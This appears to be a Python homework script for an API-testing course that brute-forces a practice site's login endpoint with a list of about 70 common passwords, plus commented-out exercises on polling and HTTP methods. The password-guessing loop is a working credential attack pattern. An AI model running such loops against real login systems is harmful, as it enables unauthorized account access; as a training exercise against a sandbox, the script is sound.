import requests
import json
import time


def some_password():
    passwords = [
        '1qaz2wsx', '121212', 'princess', '555555', 'donald', 'zaq1zaq1', '1q2w3e4r', 'access', 'bailey', 'shadow',
        'azerty', 'freedom', '123qwe', 'login', 'password1', 'michael', 'qwertyuiop', 'adobe123[a]', 'passw0rd',
        'password', '12345678', 'jesus', 'ninja', 'welcome', 'loveme', 'iloveyou', 'batman', 'superman', 'monkey',
        '1234567890', 'sunshine', 'ashley', 'Football', 'whatever', 'mustang', 'starwars', 'qazwsx', 'hello',
        'qwerty123', '123456', 'football', 'letmein', 'hottie', 'solo', 'dragon', '666666', 'flower', '1234', '111111',
        '696969', '12345', 'trustno1', '888888', '7777777', '1234567', 'charlie', 'aa123456', '000000', 'baseball',
        'admin', 'qwerty', 'abc123', 'master', 'lovely', 'photoshop[a]', '123123', '654321', '!@#$%^&*', '123456789'
    ]
    login = "super_admin"
    url_passwords = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    url_cookies = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
    for password in passwords:
        data = {"login": login, "password": password}
        response_1 = requests.post(url_passwords, data=data)
        cookies = response_1.cookies
        response_2 = requests.get(url_cookies, cookies=cookies)
        if response_2.text == "You are authorized":
            print(password)
            print(response_2.text)
            break


some_password()

'''def test_longtime_job():
    respons_1 = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job")
    token = json.loads(respons_1.text)
    respons_2 = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job", params=token)
    answer = json.loads(respons_2.text)
    if answer["status"] == "Job is NOT ready":
        time.sleep(token["seconds"])
        respons_3 = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job", params=token)
        result = json.loads(respons_3.text)
        assert result["result"] == "42" and result["status"] == "Job is ready"
        print(respons_3.text)
        print(respons_3.status_code)'''

'''def test_check_http_methods():
    methods_list = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "COPY", "HEAD", "LINK", "UNLINK", "PURGE", "LOCK", "UNLOCK", "PROPFIND", "VIEW"]
    link = "https://playground.learnqa.ru/ajax/api/compare_query_type"
    allowed_methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "COPY", "HEAD", "LINK", "UNLINK", "PURGE", "LOCK", "UNLOCK", "PROPFIND", "VIEW"]
    print_string = "HTTP type: {}, method in params/data: {}\nRespose: code {}, text \"{}\"\nКоректно: {}\n"

    for http_method in allowed_methods:
        for check_method in methods_list:
            if http_method == "GET":
                result = requests.request(method=http_method,
                                          url=link,
                                          params={"method": check_method})
            else:
                result = requests.request(method=http_method,
                                          url=link,
                                          data={"method": check_method})

            print(print_string.format(result.request.method,
                                      check_method,
                                      result.status_code,
                                      result.text,
                                      result.text == '{"success":"!"}'))'''
